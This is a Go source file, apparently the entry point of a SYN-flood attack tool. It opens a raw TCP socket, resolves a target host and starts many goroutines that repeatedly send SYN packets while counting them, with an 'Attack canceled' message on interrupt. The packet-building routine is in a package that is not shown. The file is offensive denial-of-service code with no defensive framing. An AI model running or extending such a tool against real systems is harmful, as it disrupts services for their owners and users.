package main

import (
  "fmt"
  "os"
  "os/signal"
  "sync"
  "context"
  "net"
  "time"

  "syn/src/config"
  "syn/src/tool"
)

func main() {
  if os.Args[1] == "--help" {
    fmt.Println(config.Help())
    os.Exit(0)
  }

  flags, err := config.ParseFlags()
  if err != nil {
    fmt.Println(err)
    config.PrintDefaults()
    os.Exit(1)
  }

  c, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
  if err != nil {
    fmt.Println(err)
    os.Exit(1)
  }

  defer c.Close()

  fmt.Println(config.Banner(flags))

  hostIP, err := net.LookupIP(flags.Host)
  if err != nil {
    fmt.Println(err)
    os.Exit(1)
  }

  flags.Host = hostIP[0].String()

  ctx, cancel := context.WithCancel(context.Background())

  quit := make(chan struct{})
  sigChan := make(chan os.Signal, 1)
  signal.Notify(sigChan, os.Interrupt)


  var wg sync.WaitGroup

  var cont int64

  for i := 0; i < flags.Quantity; i++ {
    wg.Add(1)
    go func() {
      defer wg.Done()

      for {
        select {
        case <-sigChan:
          fmt.Println("\nAttack canceled")
          close(quit)
          cancel()
          return
        case <-ctx.Done():
          return
        default:
          if err := tool.SendSYN(c, *flags); err != nil {
            fmt.Printf("Error: %s\n", err)
            close(quit)
            cancel()
            return
          }
          cont++
          fmt.Printf("\rNumber of packages sent: %d", cont)
          time.Sleep(time.Second * 1)
        }
      }
    }()
  }

  <-quit
  wg.Wait()

}
